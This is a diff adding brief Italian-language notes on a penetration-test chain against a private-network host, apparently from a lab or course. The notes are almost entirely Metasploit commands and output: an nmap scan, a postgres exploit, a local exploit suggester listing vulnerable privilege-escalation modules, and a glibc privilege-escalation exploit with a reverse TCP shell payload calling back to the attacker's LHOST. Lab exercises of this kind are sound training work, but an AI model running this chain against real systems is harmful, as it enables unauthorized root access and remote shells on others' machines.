@@ -1,0 +1,17 @@
+1) Scan nmap servizi - nmap -sV -T5 192.168.1.40
+2) Exploit/linux/postgres-payload
+3) Exploit session attuale - use post/multi/recon/local_exploit_suggester (set session 2)
+
+   exploit/linux/local/glibc_ld_audit_dso_load_priv_esc               Yes                      The target appears to be vulnerable.
+   exploit/linux/local/glibc_origin_expansion_priv_esc                Yes                      The target appears to be vulnerable
+   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
+   exploit/linux/local/ptrace_sudo_token_priv_esc                     Yes                      The service is running, but could not be validated.
+   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+   exploit/unix/local/setuid_nmap                                     Yes                      The target is vulnerable. /usr/bin/nmap is setuid
+
+4) Utilizzo l'exploit - use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
+5) Payload x86 - set payload payload/linux/x86/shell_reverse_tcp
+6) set LHOST 192.168.1.25
+   set session 3
+   run
+7) foto7
